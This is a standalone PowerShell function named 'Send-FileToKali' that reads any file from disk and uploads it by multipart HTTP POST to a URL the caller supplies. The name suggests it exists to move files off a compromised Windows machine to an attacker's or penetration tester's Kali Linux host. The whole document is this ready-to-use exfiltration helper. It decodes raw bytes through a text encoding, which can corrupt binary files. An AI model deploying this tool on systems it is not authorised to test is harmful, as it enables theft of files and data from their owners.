function Send-FileToKali {
    param(
        [Parameter(Mandatory = $true)]
        [string]$FilePath,

        [Parameter(Mandatory = $true)]
        [string]$UploadUrl
    )

    Write-Host "Sending File: $FilePath to $UploadUrl"

    try {
        $boundary = [System.Guid]::NewGuid().ToString()
        $contentType = "multipart/form-data; boundary=$boundary"

        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)

        $body = [System.Text.StringBuilder]::new()
        $body.AppendLine("--$boundary")
        $body.AppendLine('Content-Disposition: form-data; name="file"; filename="{0}"' -f (Split-Path $FilePath -Leaf))
        $body.AppendLine('Content-Type: application/octet-stream')
        $body.AppendLine()
        $body.Append([System.Text.Encoding]::Default.GetString($fileBytes))
        $body.AppendLine()
        $body.AppendLine("--$boundary--")

        $bodyBytes = [System.Text.Encoding]::Default.GetBytes($body.ToString())

        $request = [System.Net.HttpWebRequest]::Create($UploadUrl)
        $request.Method = "POST"
        $request.ContentType = $contentType
        $request.ContentLength = $bodyBytes.Length

        $requestStream = $request.GetRequestStream()
        $requestStream.Write($bodyBytes, 0, $bodyBytes.Length)
        $requestStream.Close()
        $response = $request.GetResponse()

        return $response
    } catch {
        Write-Error "Error al enviar el archivo al servidor: $_"
    }
}
